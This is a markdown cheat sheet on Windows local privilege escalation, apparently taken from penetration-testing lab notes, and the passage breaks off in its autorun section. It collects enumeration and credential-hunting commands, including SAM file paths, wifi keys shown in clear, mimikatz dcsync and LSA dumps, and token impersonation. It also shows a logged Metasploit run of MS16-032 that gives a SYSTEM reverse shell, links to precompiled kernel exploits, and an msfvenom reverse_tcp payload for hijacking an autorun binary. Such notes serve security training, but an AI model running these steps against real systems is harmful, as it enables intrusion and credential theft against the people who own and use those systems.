# Local exploit Windows

- [Local enumeration](#local-enumeration)
	- [hostname](#hostname)
	- [systeminfo](#systeminfo)
	- [Windows Management Instrumentation WMI](#windows-management-insrumentation-wmi)
	- [List installed software](#list-installed-software)
	- [Local disk](#local-disk)
	- [User enumeration](#local-enumeration)
	- [Network connections](#network-connections)
	- [Passwords](#passwords)
	- [Local files to grab](#local-files-to-grab)
	- [Stored credentials](#stored-credentials)
	- [Wifi password](#wifi-password)
	- [Antivirus software](#antivirus-software)
	- [Firewall](#firewall)
- [Automated tools](#automated-tools)
	- [WinPEAS](#winpeas)
	- [Windows Privesc check list](#windows-privesc-check-list)
	- [Sherlock](#sherlock)
	- [Watson](#watson)
	- [PowerUp](#powerup)
	- [JAWS](#jaws)
	- [Windows-Exploit-Suggester](#windows-exploit-suggester)
	- [Metasploit local exploit suggester](#metasploit-local-exploit-suggester)
	- [SeatBelt](#seatbelt)
	- [SharpUp](#sharpup)
	- [WindowsEnum](#windowsenum)
	- [Meterpreter](#meterpreter)
	- [Mimikatz](#mimikatz)
- [Kernel exploit](#kernel-exploit)
	- [Kitrap0d](#kitrap0d)
	- [MS10-059](#ms10-059)
	- [MS16-098](#ms16-098)
- [Linux Subsystem for Windows](#linux-subsystem-for-windows)
- [Token impersonation](#token-impersonation)
- [getsystem](#getsystem)
- [runAs](#runas)
- [autorun](#autorun)
- [Always Installed Elevated](#alwaysinstalledelevated)
- [Service escalation](#service-escalation)
- [Executable files](#executable-files)
- [Startup Applications](#startup-applications)
- [DLL hijacking](#dll-hijacking)
- [Service Permissions and path](#service-permissions-and-path)
- [Unquoted service path](#unquoted-service-path)
- [CVE-2019-1388](#cve-2019-1388)
- [RoguePotato](#rogue-potato)

## Local enumeration

### hostname

```
C:\Users\sugo>hostname
GRAVITY

C:\Users\sugo>
```

### systeminfo

```
c:\windows\system32\inetsrv>systeminfo | findstr /B /C:"OS Name" /C:"OS Version" /C:"System Type"
systeminfo | findstr /B /C:"OS Name" /C:"OS Version" /C:"System Type"
OS Name:                   Microsoft Windows 7 Enterprise
OS Version:                6.1.7600 N/A Build 7600
System Type:               X86-based PC
```

```
c:\windows\system32\inetsrv>systeminfo
systeminfo

Host Name:                 DEVEL
OS Name:                   Microsoft Windows 7 Enterprise
OS Version:                6.1.7600 N/A Build 7600
OS Manufacturer:           Microsoft Corporation
OS Configuration:          Standalone Workstation
OS Build Type:             Multiprocessor Free
Registered Owner:          babis
Registered Organization:
Product ID:                55041-051-0948536-86302
Original Install Date:     17/3/2017, 4:17:31 
System Boot Time:          3/4/2021, 11:58:17 
System Manufacturer:       VMware, Inc.
System Model:              VMware Virtual Platform
System Type:               X86-based PC
Processor(s):              1 Processor(s) Installed.
                           [01]: x64 Family 23 Model 1 Stepping 2 AuthenticAMD ~2000 Mhz
BIOS Version:              Phoenix Technologies LTD 6.00, 12/12/2018
Windows Directory:         C:\Windows
System Directory:          C:\Windows\system32
Boot Device:               \Device\HarddiskVolume1
System Locale:             el;Greek
Input Locale:              en-us;English (United States)
Time Zone:                 (UTC+02:00) Athens, Bucharest, Istanbul
Total Physical Memory:     3.071 MB
Available Physical Memory: 2.477 MB
Virtual Memory: Max Size:  6.141 MB
Virtual Memory: Available: 5.556 MB
Virtual Memory: In Use:    585 MB
Page File Location(s):     C:\pagefile.sys
Domain:                    HTB
Logon Server:              N/A
Hotfix(s):                 N/A
Network Card(s):           1 NIC(s) Installed.
                           [01]: vmxnet3 Ethernet Adapter
                                 Connection Name: Local Area Connection 3
                                 DHCP Enabled:    No
                                 IP address(es)
                                 [01]: 10.10.10.5
                                 [02]: fe80::58c0:f1cf:abc6:bb9e
                                 [03]: dead:beef::28be:c7e1:1cec:59a5
                                 [04]: dead:beef::58c0:f1cf:abc6:bb9e
```

### Windows Management Instrumentation (WMI)

```
wmic qfe get Caption,Description,HotFixID,InstalledON


C:\Users\sugo>wmic qfe get Caption,Description,HotFixID,InstalledON
Caption                                     Description      HotFixID   InstalledOn
http://support.microsoft.com/?kbid=4601056  Update           KB4601056  2/11/2021
http://support.microsoft.com/?kbid=4513661  Update           KB4513661  1/9/2020
http://support.microsoft.com/?kbid=4516115  Security Update  KB4516115  1/9/2020
http://support.microsoft.com/?kbid=4517245  Update           KB4517245  1/9/2020
http://support.microsoft.com/?kbid=4528759  Security Update  KB4528759  1/9/2020
http://support.microsoft.com/?kbid=4535680  Security Update  KB4535680  1/15/2021
http://support.microsoft.com/?kbid=4537759  Security Update  KB4537759  3/25/2020
http://support.microsoft.com/?kbid=4541338  Security Update  KB4541338  3/24/2020
http://support.microsoft.com/?kbid=4552152  Security Update  KB4552152  4/15/2020
http://support.microsoft.com/?kbid=4559309  Update           KB4559309  7/6/2020
http://support.microsoft.com/?kbid=4560959  Security Update  KB4560959  6/10/2020
http://support.microsoft.com/?kbid=4561600  Security Update  KB4561600  6/10/2020
http://support.microsoft.com/?kbid=4565554  Security Update  KB4565554  7/15/2020
http://support.microsoft.com/?kbid=4569073  Security Update  KB4569073  8/12/2020
https://support.microsoft.com/help/4576751  Security Update  KB4576751  9/8/2020
https://support.microsoft.com/help/4577670  Security Update  KB4577670  10/14/2020
https://support.microsoft.com/help/4580325  Security Update  KB4580325  10/14/2020
https://support.microsoft.com/help/4586863  Security Update  KB4586863  11/11/2020
https://support.microsoft.com/help/4598479  Security Update  KB4598479  1/14/2021
https://support.microsoft.com/help/4601395  Security Update  KB4601395  2/11/2021
https://support.microsoft.com/help/5000908  Security Update  KB5000908  3/11/2021
https://support.microsoft.com/help/5000808  Security Update  KB5000808  3/11/2021
```

```
c:\windows\system32\inetsrv>wmic qfe
C:\Users\sugo>wmic qfe
Caption                                     CSName   Description      FixComments  HotFixID   InstallDate  InstalledBy          InstalledOn  Name  ServicePackInEffect  Status
http://support.microsoft.com/?kbid=4601056  GRAVITY  Update                        KB4601056               NT AUTHORITY\SYSTEM  2/11/2021
http://support.microsoft.com/?kbid=4513661  GRAVITY  Update                        KB4513661                                    1/9/2020
http://support.microsoft.com/?kbid=4516115  GRAVITY  Security Update               KB4516115                                    1/9/2020
http://support.microsoft.com/?kbid=4517245  GRAVITY  Update                        KB4517245                                    1/9/2020
http://support.microsoft.com/?kbid=4528759  GRAVITY  Security Update               KB4528759                                    1/9/2020
http://support.microsoft.com/?kbid=4535680  GRAVITY  Security Update               KB4535680               NT AUTHORITY\SYSTEM  1/15/2021
http://support.microsoft.com/?kbid=4537759  GRAVITY  Security Update               KB4537759               NT AUTHORITY\SYSTEM  3/25/2020
http://support.microsoft.com/?kbid=4541338  GRAVITY  Security Update               KB4541338               NT AUTHORITY\SYSTEM  3/24/2020
http://support.microsoft.com/?kbid=4552152  GRAVITY  Security Update               KB4552152               NT AUTHORITY\SYSTEM  4/15/2020
http://support.microsoft.com/?kbid=4559309  GRAVITY  Update                        KB4559309               NT AUTHORITY\SYSTEM  7/6/2020
http://support.microsoft.com/?kbid=4560959  GRAVITY  Security Update               KB4560959               NT AUTHORITY\SYSTEM  6/10/2020
http://support.microsoft.com/?kbid=4561600  GRAVITY  Security Update               KB4561600               NT AUTHORITY\SYSTEM  6/10/2020
http://support.microsoft.com/?kbid=4565554  GRAVITY  Security Update               KB4565554               NT AUTHORITY\SYSTEM  7/15/2020
http://support.microsoft.com/?kbid=4569073  GRAVITY  Security Update               KB4569073               NT AUTHORITY\SYSTEM  8/12/2020
https://support.microsoft.com/help/4576751  GRAVITY  Security Update               KB4576751               NT AUTHORITY\SYSTEM  9/8/2020
https://support.microsoft.com/help/4577670  GRAVITY  Security Update               KB4577670               NT AUTHORITY\SYSTEM  10/14/2020
https://support.microsoft.com/help/4580325  GRAVITY  Security Update               KB4580325               NT AUTHORITY\SYSTEM  10/14/2020
https://support.microsoft.com/help/4586863  GRAVITY  Security Update               KB4586863               NT AUTHORITY\SYSTEM  11/11/2020
https://support.microsoft.com/help/4598479  GRAVITY  Security Update               KB4598479               NT AUTHORITY\SYSTEM  1/14/2021
https://support.microsoft.com/help/4601395  GRAVITY  Security Update               KB4601395               NT AUTHORITY\SYSTEM  2/11/2021
https://support.microsoft.com/help/5000908  GRAVITY  Security Update               KB5000908               NT AUTHORITY\SYSTEM  3/11/2021
https://support.microsoft.com/help/5000808  GRAVITY  Security Update               KB5000808               NT AUTHORITY\SYSTEM  3/11/2021
```

### List installed software

```
C:\WINDOWS\system32>wmic
wmic:root\cli>/output:c:\installed_programs.txt product get name,version
wmic:root\cli>

C:\Windows\system32>wmic product get name,version
Name                                        Version
Kaspersky Security Center 10 Network Agent  10.3.407
Microsoft Update Health Tools               2.81.0.0
Kaspersky Endpoint Security for Windows     11.5.0.590
Python 2.7.1                                2.7.1150
```

### Local disks

```
c:\windows\system32\inetsrv>wmic logicaldisk get caption,description,providername
wmic logicaldisk get caption,description,providername
Caption  Description              ProviderName
A:       3 1/2 Inch Floppy Drive
C:       Local Fixed Disk
```

### User enumeration

```
c:\windows\system32\inetsrv>whoami
whoami
iis apppool\web



c:\windows\system32\inetsrv>whoami /priv
whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                               State
============================= ========================================= ========
SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled
SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled
SeShutdownPrivilege           Shut down the system                      Disabled
SeAuditPrivilege              Generate security audits                  Disabled
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled
SeUndockPrivilege             Remove computer from docking station      Disabled
SeImpersonatePrivilege        Impersonate a client after authentication Enabled
SeCreateGlobalPrivilege       Create global objects                     Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled
SeTimeZonePrivilege           Change the time zone                      Disabled




c:\windows\system32\inetsrv>whoami /groups
whoami /groups

GROUP INFORMATION
-----------------

Group Name                           Type             SID          Attributes
==================================== ================ ============ ==================================================
Mandatory Label\High Mandatory Level Label            S-1-16-12288
Everyone                             Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                        Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\SERVICE                 Well-known group S-1-5-6      Mandatory group, Enabled by default, Enabled group
CONSOLE LOGON                        Well-known group S-1-2-1      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users     Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization       Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group
BUILTIN\IIS_IUSRS                    Alias            S-1-5-32-568 Mandatory group, Enabled by default, Enabled group
LOCAL                                Well-known group S-1-2-0      Mandatory group, Enabled by default, Enabled group
                                     Unknown SID type S-1-5-82-0   Mandatory group, Enabled by default, Enabled group




c:\windows\system32\inetsrv>net user
net user

User accounts for \\

-------------------------------------------------------------------------------
Administrator            babis                    Guest
The command completed with one or more errors.







c:\windows\system32\inetsrv>net user babis
net user babis
User name                    babis
Full Name
Comment
User's comment
Country code                 000 (System Default)
Account active               Yes
Account expires              Never

Password last set            18/3/2017 2:15:19 ▒▒
Password expires             Never
Password changeable          18/3/2017 2:15:19 ▒▒
Password required            No
User may change password     Yes

Workstations allowed         All
Logon script
User profile
Home directory
Last logon                   18/3/2017 2:17:50 ▒▒

Logon hours allowed          All

Local Group Memberships      *Users
Global Group memberships     *None
The command completed successfully.





c:\windows\system32\inetsrv>net localgroup administrators
net localgroup administrators
Alias name     administrators
Comment        Administrators have complete and unrestricted access to the computer/domain

Members

-------------------------------------------------------------------------------
Administrator
The command completed successfully.
```	

### Network connections

```
c:\windows\system32\inetsrv>netstat -ano
netstat -ano

Active Connections

  Proto  Local Address          Foreign Address        State           PID
  TCP    0.0.0.0:21             0.0.0.0:0              LISTENING       1416
  TCP    0.0.0.0:80             0.0.0.0:0              LISTENING       4
  TCP    0.0.0.0:135            0.0.0.0:0              LISTENING       708
  TCP    0.0.0.0:445            0.0.0.0:0              LISTENING       4
  TCP    0.0.0.0:5357           0.0.0.0:0              LISTENING       4
  TCP    0.0.0.0:49152          0.0.0.0:0              LISTENING       412
  TCP    0.0.0.0:49153          0.0.0.0:0              LISTENING       772
  TCP    0.0.0.0:49154          0.0.0.0:0              LISTENING       892
  TCP    0.0.0.0:49155          0.0.0.0:0              LISTENING       512
  TCP    0.0.0.0:49156          0.0.0.0:0              LISTENING       528
  TCP    10.10.10.5:139         0.0.0.0:0              LISTENING       4
  TCP    10.10.10.5:49160       10.10.14.7:4444        ESTABLISHED     1476
  TCP    [::]:21                [::]:0                 LISTENING       1416
  TCP    [::]:80                [::]:0                 LISTENING       4
  TCP    [::]:135               [::]:0                 LISTENING       708
  TCP    [::]:445               [::]:0                 LISTENING       4
  TCP    [::]:5357              [::]:0                 LISTENING       4
  TCP    [::]:49152             [::]:0                 LISTENING       412
```

### Passwords

```
c:\Windows\System32>findstr /si password *.txt *.ini *.config
findstr /si password *.txt *.ini *.config
WindowsPowerShell\v1.0\en-US\about_hash_tables.help.txt:          Msg1="Please enter your password."
WindowsPowerShell\v1.0\en-US\about_hash_tables.help.txt:          Msg1="Please enter your password.";
WindowsPowerShell\v1.0\en-US\about_hash_tables.help.txt:          >> Msg1="Please enter your password.";
WindowsPowerShell\v1.0\en-US\about_hash_tables.help.txt:          Msg1                    Please enter your password.
WindowsPowerShell\v1.0\en-US\about_hash_tables.help.txt:          Please enter your password.
WindowsPowerShell\v1.0\en-US\about_hash_tables.help.txt:          Msg1                           Please enter your password.
WindowsPowerShell\v1.0\en-US\about_hash_tables.help.txt:          Msg1                           Please enter your password.
WindowsPowerShell\v1.0\en-US\about_hash_tables.help.txt:          Msg1="Please enter your password."
WindowsPowerShell\v1.0\en-US\about_hash_tables.help.txt:        Msg1                           "Please enter your password."
WindowsPowerShell\v1.0\en-US\about_remote_FAQ.help.txt:    name and password credentials on the local computer or the credentials
WindowsPowerShell\v1.0\en-US\about_remote_troubleshooting.help.txt:    2. Verify that a password is set on the workgroup-based computer. If a
WindowsPowerShell\v1.0\en-US\about_remote_troubleshooting.help.txt:       password is not set or the password value is empty, you cannot run
WindowsPowerShell\v1.0\en-US\about_remote_troubleshooting.help.txt:       To set password for your user account, use User Accounts in Control
WindowsPowerShell\v1.0\en-US\about_Return.help.txt:          function ScreenPassword($instance)
WindowsPowerShell\v1.0\en-US\about_Return.help.txt:          foreach ($a in @(get-wmiobject win32_desktop)) { ScreenPassword($a) }
WindowsPowerShell\v1.0\en-US\about_Return.help.txt:      This script checks each user account. The ScreenPassword function returns
WindowsPowerShell\v1.0\en-US\about_Return.help.txt:      the name of any user account that does not have a password-protected
WindowsPowerShell\v1.0\en-US\about_Return.help.txt:      screen saver. If the screen saver is password protected, the function
WindowsPowerShell\v1.0\en-US\about_Signing.help.txt:    The MakeCert.exe tool will prompt you for a private key password. The
WindowsPowerShell\v1.0\en-US\about_Signing.help.txt:    password ensures that no one can use or access the certificate without
WindowsPowerShell\v1.0\en-US\about_Signing.help.txt:    your consent. Create and enter a password that you can remember. You will
WindowsPowerShell\v1.0\en-US\about_Signing.help.txt:    use this password later to retrieve the certificate.
WindowsPowerShell\v1.0\en-US\about_Signing.help.txt:        6. Type a password, and then type it again to confirm.
WindowsPowerShell\v1.0\en-US\about_Signing.help.txt:        4. On the Password page, select "Enable strong private key protection",
WindowsPowerShell\v1.0\en-US\about_Signing.help.txt:           and then enter the password that you assigned during the export
FINDSTR: Cannot open restore\MachineGuid.txt
```

See also:

https://sushant747.gitbooks.io/total-oscp-guide/content/privilege_escalation_windows.html

### Local files to grab

```
%SYSTEMDRIVE%\boot.ini
%WINDIR%\win.ini
%SYSTEMROOT%\repair\SAM
%SYSTEMROOT%\System32\config\RegBack\SAM
%SYSTEMROOT%\repair\SYSTEM
%SYSTEMROOT%\System32\config\RegBack\SYSTEM

%SYSTEMDRIVE%\pagefile.sys
%WINDIR%\debug\NetSetup.log
%WINDIR%\repair\sam
%WINDIR%\repair\system
%WINDIR%\repair\software
%WINDIR%\repair\security

%WINDIR%\system32\config\AppEvent.Evt
%WINDIR%\system32\config\SecEvent.Evt
%WINDIR%\system32\config\default.sav
%WINDIR%\system32\config\security.sav
%WINDIR%\system32\config\software.sav
%WINDIR%\system32\config\system.sav
```

See also:

https://msrc-blog.microsoft.com/2014/05/13/ms14-025-an-update-for-group-policy-preferences/

### Stored credentials

```
PS C:\Users\security> cmdkey /list

Currently stored credentials:

    Target: Domain:interactive=ACCESS\Administrator
    Type: Domain Password
    User: ACCESS\Administrator
```

### Wifi Password

```
netsh wlan show profile <SSID> key=clear
```

### Antivirus software

```
c:\Windows\System32>sc query windefend
sc query windefend

SERVICE_NAME: windefend
        TYPE               : 20  WIN32_SHARE_PROCESS
        STATE              : 4  RUNNING
                                (STOPPABLE, NOT_PAUSABLE, ACCEPTS_SHUTDOWN)
        WIN32_EXIT_CODE    : 0  (0x0)
        SERVICE_EXIT_CODE  : 0  (0x0)
        CHECKPOINT         : 0x0
        WAIT_HINT          : 0x0





c:\windows\system32\inetsrv>sc queryex type= service
sc queryex type= service

SERVICE_NAME: AppHostSvc
DISPLAY_NAME: Application Host Helper Service
        TYPE               : 20  WIN32_SHARE_PROCESS
        STATE              : 4  RUNNING
                                (STOPPABLE, PAUSABLE, ACCEPTS_SHUTDOWN)
        WIN32_EXIT_CODE    : 0  (0x0)
        SERVICE_EXIT_CODE  : 0  (0x0)
        CHECKPOINT         : 0x0
        WAIT_HINT          : 0x0
        PID                : 1332
        FLAGS              :
```

### Firewall

```
c:\windows\system32\inetsrv>netsh advfirewall firewall dump



c:\windows\system32\inetsrv>netsh firewall show state
netsh firewall show state

Firewall status:
-------------------------------------------------------------------
Profile                           = Standard
Operational mode                  = Enable
Exception mode                    = Enable
Multicast/broadcast response mode = Enable
Notification mode                 = Enable
Group policy version              = Windows Firewall
Remote admin mode                 = Disable

Ports currently open on all network interfaces:
Port   Protocol  Version  Program
-------------------------------------------------------------------
No ports are currently open on all network interfaces.



c:\windows\system32\inetsrv>netsh firewall show config
netsh firewall show config

Domain profile configuration:
-------------------------------------------------------------------
Operational mode                  = Enable
Exception mode                    = Enable
Multicast/broadcast response mode = Enable
Notification mode                 = Enable

Allowed programs configuration for Domain profile:
Mode     Traffic direction    Name / Program
-------------------------------------------------------------------

Port configuration for Domain profile:
Port   Protocol  Mode    Traffic direction     Name
-------------------------------------------------------------------

ICMP configuration for Domain profile:
Mode     Type  Description
-------------------------------------------------------------------
Enable   2     Allow outbound packet too big

Standard profile configuration (current):
-------------------------------------------------------------------
Operational mode                  = Enable
Exception mode                    = Enable
Multicast/broadcast response mode = Enable
Notification mode                 = Enable

Service configuration for Standard profile:
Mode     Customized  Name
-------------------------------------------------------------------
Enable   No          File and Printer Sharing
Enable   No          Network Discovery

Allowed programs configuration for Standard profile:
Mode     Traffic direction    Name / Program
-------------------------------------------------------------------

Port configuration for Standard profile:
Port   Protocol  Mode    Traffic direction     Name
-------------------------------------------------------------------

ICMP configuration for Standard profile:
Mode     Type  Description
-------------------------------------------------------------------
Enable   2     Allow outbound packet too big

Log configuration:
-------------------------------------------------------------------
File location   = C:\Windows\system32\LogFiles\Firewall\pfirewall.log
Max file size   = 4096 KB
Dropped packets = Disable
Connections     = Disable

IMPORTANT: Command executed successfully.
However, "netsh firewall" is deprecated;
use "netsh advfirewall firewall" instead.
For more information on using "netsh advfirewall firewall" commands
instead of "netsh firewall", see KB article 947709
at http://go.microsoft.com/fwlink/?linkid=121488 .
```

## Automated Tools

### WinPEAS

https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS

### Windows Privesc check list

https://book.hacktricks.xyz/windows/checklist-windows-privilege-escalation

### Sherlock

https://github.com/rasta-mouse/Sherlock

```
C:\Users\kostas\Desktop>powershell.exe -ExecutionPolicy Bypass -command "& {Import-Module .\sherlock.ps1; Find-AllVulns}"
```

```
Title      : Secondary Logon Handle
MSBulletin : MS16-032
CVEID      : 2016-0099
Link       : https://www.exploit-db.com/exploits/39719/
VulnStatus : Appears Vulnerable
```

### Watson

https://github.com/rasta-mouse/Watson

### PowerUp

https://github.com/PowerShellMafia/PowerSploit/tree/master/Privesc

### JAWS

https://github.com/411Hall/JAWS

### Windows-Exploit-Suggester

https://github.com/AonCyberLabs/Windows-Exploit-Suggester

https://raw.githubusercontent.com/AonCyberLabs/Windows-Exploit-Suggester/master/windows-exploit-suggester.py

first step to run:

```
./windows-exploit-suggester.py  --update
[*] initiating winsploit version 3.3...
[+] writing to file 2020-09-22-mssb.xls
[*] done
```

grab systeminfo (just after the line "systeminfo") and then run:

```
./windows-exploit-suggester.py --database 2020-09-22-mssb.xls --systeminfo nomehost-sysinfo.txt
```

### Metasploit local exploit suggester

https://www.rapid7.com/blog/post/2015/08/11/metasploit-local-exploit-suggester-do-less-get-more/

```
use post/multi/recon/local_exploit_suggester

options -> set session number

run

msf5 exploit(multi/handler) > use post/multi/recon/local_exploit_suggester
msf5 post(multi/recon/local_exploit_suggester) > options

Module options (post/multi/recon/local_exploit_suggester):

   Name             Current Setting  Required  Description
   ----             ---------------  --------  -----------
   SESSION                           yes       The session to run this module on
   SHOWDESCRIPTION  false            yes       Displays a detailed description for the available exploits

msf5 post(multi/recon/local_exploit_suggester) > set SESSION 1
SESSION => 1
msf5 post(multi/recon/local_exploit_suggester) > run

[*] 10.10.10.5 - Collecting local exploits for x86/windows...


[*] 10.10.10.5 - 30 exploit checks are being tried...
[+] 10.10.10.5 - exploit/windows/local/bypassuac_eventvwr: The target appears to be vulnerable.
[+] 10.10.10.5 - exploit/windows/local/ms10_015_kitrap0d: The service is running, but could not be validated.
[+] 10.10.10.5 - exploit/windows/local/ms10_092_schelevator: The target appears to be vulnerable.
[+] 10.10.10.5 - exploit/windows/local/ms13_053_schlamperei: The target appears to be vulnerable.
[+] 10.10.10.5 - exploit/windows/local/ms13_081_track_popup_menu: The target appears to be vulnerable.
[+] 10.10.10.5 - exploit/windows/local/ms14_058_track_popup_menu: The target appears to be vulnerable.
[+] 10.10.10.5 - exploit/windows/local/ms15_004_tswbproxy: The service is running, but could not be validated.
[+] 10.10.10.5 - exploit/windows/local/ms15_051_client_copy_image: The target appears to be vulnerable.
[+] 10.10.10.5 - exploit/windows/local/ms16_016_webdav: The service is running, but could not be validated.
[+] 10.10.10.5 - exploit/windows/local/ms16_075_reflection: The target appears to be vulnerable.
[+] 10.10.10.5 - exploit/windows/local/ppr_flatten_rec: The target appears to be vulnerable.
[*] Post module execution completed
msf5 post(multi/recon/local_exploit_suggester) >
msf5 post(multi/recon/local_exploit_suggester) >
msf5 post(multi/recon/local_exploit_suggester) > use exploit/windows/local/ms10_015_kitrap0d
```

MS16-023 (Windows 7 < 10, 2008 < 2012 R2 x86/x64)

```
msf5 post(multi/recon/local_exploit_suggester) > use exploit/windows/local/ms16_032_secondary_logon_handle_privesc

msf5 exploit(windows/local/ms16_032_secondary_logon_handle_privesc) > set session 2
session => 2
msf5 exploit(windows/local/ms16_032_secondary_logon_handle_privesc) > set LHOST tun0
LHOST => tun0
msf5 exploit(windows/local/ms16_032_secondary_logon_handle_privesc) > set LPORT 5555
LPORT => 5555
msf5 exploit(windows/local/ms16_032_secondary_logon_handle_privesc) > run

[*] Started HTTPS reverse handler on https://10.10.14.36:5555
[+] Compressed size: 1016
[!] Executing 32-bit payload on 64-bit ARCH, using SYSWOW64 powershell
[*] Writing payload file, C:\Users\kostas\AppData\Local\Temp\nLtRgSV.ps1...
[*] Compressing script contents...
[+] Compressed size: 3592
[*] Executing exploit script...
         __ __ ___ ___   ___     ___ ___ ___
        |  V  |  _|_  | |  _|___|   |_  |_  |
        |     |_  |_| |_| . |___| | |_  |  _|
        |_|_|_|___|_____|___|   |___|___|___|

                       [by b33f -> @FuzzySec]

[?] Operating system core count: 2
[>] Duplicating CreateProcessWithLogonW handle
[?] Done, using thread handle: 1368

[*] Sniffing out privileged impersonation token..

[?] Thread belongs to: svchost
[+] Thread suspended
[>] Wiping current impersonation token
[>] Building SYSTEM impersonation token
[?] Success, open SYSTEM token handle: 1380
[+] Resuming thread..
[*] Sniffing out SYSTEM shell..

[>] Duplicating SYSTEM token
[>] Starting token race
[>] Starting process race
[!] Holy handle leak Batman, we have a SYSTEM shell!!

Zgx3eCJEr0FX6AKp3odo56cSmmKaMXTA
[+] Executed on target machine.
[*] https://10.10.14.36:5555 handling request from 10.10.10.8; (UUID: u15inr4m) Staging x86 payload (177241 bytes) ...
[*] Meterpreter session 3 opened (10.10.14.36:5555 -> 10.10.10.8:49185) at 2020-06-28 22:34:40 +0200
[+] Deleted C:\Users\kostas\AppData\Local\Temp\nLtRgSV.ps1

meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
```

### SeatBelt

https://github.com/GhostPack/Seatbelt

### SharpUp

https://github.com/GhostPack/SharpUp

### WindowsEnum


https://github.com/absolomb/WindowsEnum


```
usage:

powershell -nologo -executionpolicy bypass -file WindowsEnum.ps1

advanced usage:

powershell -nologo -executionpolicy bypass -file WindowsEnum.ps1 extended
```

Meterpreter, getuid

getuid fails?

```
meterpreter > getuid
[-] stdapi_sys_config_getuid: Operation failed: Access is denied
```

try "ps":

```
meterpreter > ps

Process List
============

 PID   PPID  Name               Arch  Session  User                          Path
 ---   ----  ----               ----  -------  ----                          ----
 0     0     [System Process]
 4     0     System
 272   4     smss.exe
 320   1088  cidaemon.exe
 324   272   csrss.exe
 348   272   winlogon.exe
 396   348   services.exe
 408   348   lsass.exe
 584   1088  cidaemon.exe
 612   396   svchost.exe
 660   1088  cidaemon.exe
 684   396   svchost.exe
 740   396   svchost.exe
 768   396   svchost.exe
 804   396   svchost.exe
 940   396   spoolsv.exe
 968   396   msdtc.exe
 1088  396   cisvc.exe
 1128  396   svchost.exe
 1184  396   inetinfo.exe
 1220  396   svchost.exe
 1332  396   VGAuthService.exe
 1416  396   vmtoolsd.exe
 1464  396   svchost.exe
 1604  396   svchost.exe
 1708  396   alg.exe
 1844  612   wmiprvse.exe       x86   0        NT AUTHORITY\NETWORK SERVICE  C:\WINDOWS\system32\wbem\wmiprvse.exe
 1920  396   dllhost.exe
 2308  612   wmiprvse.exe
 2456  348   logon.scr
 2948  612   davcdata.exe       x86   0        NT AUTHORITY\NETWORK SERVICE  C:\WINDOWS\system32\inetsrv\davcdata.exe
 3524  1464  w3wp.exe           x86   0        NT AUTHORITY\NETWORK SERVICE  c:\windows\system32\inetsrv\w3wp.exe
 3608  3524  rundll32.exe       x86   0                                      C:\WINDOWS\system32\rundll32.exe
```

and the "migrate":

```
meterpreter > migrate 1844
[*] Migrating from 3608 to 1844...
[*] Migration completed successfully.
meterpreter > getuid
Server username: NT AUTHORITY\NETWORK SERVICE
meterpreter >
```

then, use "suggester" to find exploits

### Mimikatz

fetch trunk:

https://github.com/gentilkiwi/mimikatz/releases/tag/2.2.0-20200715

dcsync usage:

https://blog.stealthbits.com/extracting-user-password-data-with-mimikatz-dcsync/

```
./mimicat.exe "lsadump::dcsync /user:administrator" "exit"
```

https://www.fuzzysecurity.com/tutorials/16.html
 

## Kernel exploit

https://github.com/SecWiki/windows-kernel-exploits

```
root@kali:/opt/tools# git clone https://github.com/SecWiki/windows-kernel-exploits.git
Cloning into 'windows-kernel-exploits'...
remote: Enumerating objects: 17, done.
remote: Counting objects: 100% (17/17), done.
remote: Compressing objects: 100% (17/17), done.
remote: Total 1592 (delta 7), reused 0 (delta 0), pack-reused 1575
Receiving objects: 100% (1592/1592), 238.64 MiB | 10.17 MiB/s, done.
Resolving deltas: 100% (670/670), done.
Updating files: 100% (433/433), done.
```

### Kitrap0d

https://seclists.org/fulldisclosure/2010/Jan/341

### MS10-059

https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS10-059

### MS16-098

https://www.exploit-db.com/exploits/41020

can compile with mingw-w64, eg.

```
i686-w64-mingw32-gcc 37755.c -o agos.exe -lws2_32
```

or you can download precompiled binaries:

Source: https://github.com/sensepost/ms16-098/tree/b85b8dfdd20a50fc7bc6c40337b8de99d6c4db80
Binary: https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/41020.exe

## Linux subsystem for Windows
 
Payload all the things

https://github.com/swisskyrepo/PayloadsAllTheThings/blob/f6b9d63bf8cbbb9a27be6338cd37725ca93f4eec/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md

## Token impersonation

https://academy.tcm-sec.com/courses/1154361/lectures/24797719

```
whoami /priv
```

incognito

```
meterpreter > load_incognito
meterpreter > list_tokens -u
meterpreter > impersonate_token domain\\user
```

```
Invoke-Mimikatz -Command '"privilege::debug" "LSADUMP::LSA /patch" exit' -Computer wks.domain.local
```


https://www.offensive-security.com/metasploit-unleashed/fun-incognito/

https://github.com/gtworek/Priv2Admin

https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md#eop---impersonation-privileges

https://foxglovesecurity.com/2016/09/26/rotten-potato-privilege-escalation-from-service-accounts-to-system/

https://github.com/ohpe/juicy-potato

## getsystem

https://www.cobaltstrike.com/blog/what-happens-when-i-type-getsystem/

## runAs

https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/cc771525(v=ws.11)

## autorun

sysinternals "autorun64" -> shows autorun software

```
HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
```

```
sysinternals "accesschk64.exe -wvu" 
```

-> shows files with everyone access

```
c:\users\user\desktop\tools\accesscheck\accesschk64.exe -wvu "c:\program files\autorun program"

RW everyone
	FILE_ALL_ACCESS
```

We need to find a file that we can overwrite, then we replace it with some msfvenom stuff

```
msfvenom -p windows/meterpreter/reverse_tcp lhost=10.8.147.132 -f exe -o program.exe
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
